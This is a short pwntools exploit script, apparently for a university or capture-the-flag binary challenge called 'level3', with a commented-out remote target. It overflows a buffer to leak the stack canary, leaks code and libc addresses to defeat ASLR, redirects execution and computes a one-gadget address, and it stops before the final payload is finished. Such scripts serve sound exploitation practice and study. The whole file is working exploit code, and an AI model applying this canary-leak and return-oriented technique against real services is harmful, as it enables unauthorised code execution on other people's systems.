from pwn import *

# port = 10007
# rem = remote("kayle.snu.ac.kr", port)
rem = process("./level3/problem/level3")
# gdb.attach(rem)

elf = ELF("./level3/problem/level3")
lib = ELF('./level3/problem/libc.so.6')

rem.recvline()

payload = b'A' * 0x49
rem.send(payload)
rem.recvuntil(payload)
canary = u64(b'\x00' +rem.recvn(7))
print(hex(canary))

payload = b'B' * 0x58
rem.send(payload)
rem.recvuntil(payload)
readName_addr = u64(rem.recvn(6) + b'\x00' * 2) - 34 - elf.symbols['main'] + elf.symbols['read_name']
print(hex(readName_addr))

payload = b'C' * 0x28 + p64(canary) + b'C' * 0x8 + p64(readName_addr + 5)
rem.recvuntil(b'comment: ')
rem.send(payload)
rem.recvline()

payload = b'D' * 0x58
rem.send(payload)
rem.recvuntil(payload)
print(hex(lib.symbols['__libc_start_main']))
# main243_addr = u64(rem.recvn(6) + b'\x00' * 2)
# print(hex(main243_addr))
lib_base = u64(rem.recvn(6) + b'\x00' * 2) + 48 - lib.symbols['__libc_start_main'] # for 22.04
# lib_base = main243_addr - 243 - lib.symbols['__libc_start_main'] # for 20.04
gadget_addr = lib_base + 0xebd38
print(hex(lib_base))

payload = b'E' * 0x28

# rem.interactive()